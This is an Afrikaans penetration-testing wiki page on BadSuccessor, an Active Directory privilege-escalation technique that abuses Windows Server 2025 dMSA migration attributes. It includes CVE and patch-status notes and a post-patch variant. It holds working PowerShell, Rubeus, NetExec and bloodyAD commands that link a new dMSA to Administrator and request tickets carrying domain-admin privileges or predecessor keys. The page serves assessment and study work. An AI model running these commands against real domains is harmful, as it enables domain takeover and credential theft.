# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

**BadSuccessor** misbruik die **delegated Managed Service Account**- (**dMSA**) migrasiewerkvloei wat in **Windows Server 2025** bekendgestel is. ’n dMSA kan deur **`msDS-ManagedAccountPrecededByLink`** aan ’n ouer rekening gekoppel word en deur die migrasietoestande beweeg wat in **`msDS-DelegatedMSAState`** gestoor word. As ’n aanvaller ’n dMSA in ’n skryfbare OU kan skep en daardie attribute kan beheer, kan die KDC kaartjies uitreik vir die aanvaller-beheerde dMSA met die **magtigingskonteks van die gekoppelde rekening**.<sup>[[2]](#references)</sup>

In die praktyk beteken dit dat ’n gebruiker met lae regte wat slegs gedelegeerde OU-regte het, ’n nuwe dMSA kan skep, dit na `Administrator` kan laat wys, die migrasietoestand kan voltooi en dan ’n TGT kan bekom waarvan die PAC bevoorregte groepe soos **Domain Admins** bevat.<sup>[[2]](#references)</sup>

## dMSA-migrasiebesonderhede wat saak maak

- dMSA is ’n **Windows Server 2025**-funksie.
- `Start-ADServiceAccountMigration` stel die migrasie in die **started**-toestand.
- `Complete-ADServiceAccountMigration` stel die migrasie in die **completed**-toestand.
- `msDS-DelegatedMSAState = 1` beteken dat die migrasie begin is.
- `msDS-DelegatedMSAState = 2` beteken dat die migrasie voltooi is.
- Tydens ’n wettige migrasie is die bedoeling dat die dMSA die vervangde rekening deursigtig vervang, sodat die KDC/LSA die toegang behou wat die vorige rekening reeds gehad het.<sup>[[3]](#references)</sup>

Microsoft Learn meld ook dat die oorspronklike rekening tydens migrasie aan die dMSA gekoppel word, en dat die dMSA bedoel is om toegang te kry tot dit waartoe die ou rekening toegang gehad het.<sup>[[3]](#references)</sup> Dit is die sekuriteitsaanname wat BadSuccessor misbruik.<sup>[[2]](#references)</sup>

## Vereistes

1. ’n Domein waar **dMSA bestaan**, wat beteken dat **Windows Server 2025**-ondersteuning aan die AD-kant beskikbaar is.
2. Die aanvaller kan `msDS-DelegatedManagedServiceAccount`-objekte in ’n OU skep, of het gelykwaardige breë regte om kinderobjekte daar te skep.
3. Die aanvaller kan die relevante dMSA-attribute **skryf** of die dMSA wat hulle pas geskep het, ten volle beheer.
4. Die aanvaller kan Kerberos-kaartjies vanuit ’n domein-gekoppelde konteks aanvra, of vanaf ’n tonnel wat LDAP/Kerberos bereik.<sup>[[2]](#references)</sup>

### Praktiese kontroles

Die duidelikste operateur-aanwyser is om die domein-/bosvlak te verifieer en te bevestig dat die omgewing reeds die nuwe Server 2025-stapel gebruik:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

As jy waardes soos `Windows2025Domain` en `Windows2025Forest` sien, behandel **BadSuccessor / dMSA migration abuse** as ’n prioriteitskontrole.

Jy kan ook skryfbare OUs wat gedelegeer is vir dMSA-skepping met publieke tooling enumereer:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Misbruikvloei

1. Skep 'n dMSA in 'n OU waar jy gedelegeerde create-child-regte het.
2. Stel **`msDS-ManagedAccountPrecededByLink`** op die DN van 'n bevoorregte teiken, soos `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Stel **`msDS-DelegatedMSAState`** op `2` om die migrasie as voltooi te merk.
4. Versoek 'n TGT vir die nuwe dMSA en gebruik die terugontvange kaartjie om toegang tot bevoorregte dienste te verkry.<sup>[[2]](#references)</sup>

PowerShell-voorbeeld:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Voorbeelde van Ticket-versoeke / operasionele nutsgoed:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Waarom dit meer as voorregte-eskalasie is

Tydens ’n wettige migrasie moet Windows ook die nuwe dMSA laat werk met tickets wat vóór die oorskakeling vir die vorige rekening uitgereik is. Daarom kan dMSA-verwante ticketmateriaal **huidige** en **vorige** sleutels insluit in die **`KERB-DMSA-KEY-PACKAGE`**-vloei.<sup>[[2]](#references)</sup>

Vir ’n aanvallerbeheerde vals migrasie kan dié gedrag BadSuccessor in die volgende omskep:<sup>[[2]](#references)</sup>

- **Voorregte-eskalasie** deur bevoorregte groep-SID’s in die PAC te erf.
- **Blootstelling van geloofsbriewe-materiaal** omdat die hantering van vorige sleutels materiaal kan blootlê wat gelykstaande is aan die voorganger se RC4/NT-hash in kwesbare werkvloeie.

Dit maak die tegniek nuttig vir sowel direkte domeinoorname as opvolgbedrywighede soos pass-the-hash of breër kompromittering van geloofsbriewe.

## BetterSuccessor ná die KDC-pleister

Die gepatchte KDC valideer albei kante van ’n dMSA-migrasie. Benewens die dMSA se `msDS-ManagedAccountPrecededByLink` en migrasietoestand, moet die voorganger terug na die dMSA verwys via `msDS-SupersededManagedAccountLink` en ’n versoenbare `msDS-SupersededServiceAccountState` hê. ’n Eenrigtingkoppeling misluk nou; ’n rekening wat net ’n dMSA kan skep, kan nie enige willekeurige voorganger benoem nie. Met `CreateChild` vir ’n dMSA in ’n OU **en** effektiewe skryftoegang tot die migrasie-eienskappe van die gekose teikenrekening, kan ’n aanvaller die wederkerige koppeling instel. Die gevolglike dMSA-ticket kan die voorganger se magtigingskonteks dra en sy sleutels in die dMSA-sleutelpakket blootlê. Dit is ’n geteikende pad vir toegang tot geloofsbriewe/vergroting van voorregte, nie ’n bewys dat die oorspronklike BadSuccessor met ’n willekeurige teiken steeds op gepatchte DC’s uitbuitbaar is nie.<sup>[[5]](#references)[[6]](#references)</sup>

In ’n laboratorium waar die skryftoegang tot die teikenrekening bevestig is, kan `bloodyAD` die dMSA skep en die gepaarde migrasieskryfbewerkings uitvoer. Vra die dMSA-ticket aan met die teruggegewe Kerberos-materiaal en kontroleer die teikenrekening se werklike toestemmings voordat jy aanvaar dat sy voorregte of hash herwin is. Die naam van die hulpmiddel se `badSuccessor`-subopdrag beteken nie dat dit die ongepatchte eenrigtinggedrag gebruik nie.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Notas oor pleisterstatus

Die oorspronklike BadSuccessor-gedrag is **nie net ’n teoretiese voorvrystellingkwessie uit 2025 nie**. Microsoft het dit die **CVE-2025-53779**-nommer toegeken en in **Augustus 2025** ’n sekuriteitsopdatering gepubliseer.<sup>[[4]](#references)</sup> Hou hierdie aanval gedokumenteer vir:

- **labs / CTFs / assume-breach-oefeninge**
- **ongepleisterde Windows Server 2025-omgewings**
- **validering van OU-delegasies en dMSA-blootstelling tydens assesserings**

Moenie aanvaar dat ’n Windows Server 2025-domein kwesbaar is net omdat dMSA bestaan nie; verifieer die pleistervlak en toets versigtig.

## Gereedskap

- [Akamai BadSuccessor-gereedskap](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor`-module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA-misbruik tot Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Misbruik van dMSA om voorregte in Active Directory te verhoog](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Oorsig van gedelegeerde bestuurde diensrekeninge](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor is dood, lank lewe BadSuccessor(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: Steeds misbruik van dMSA ná die pleister](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
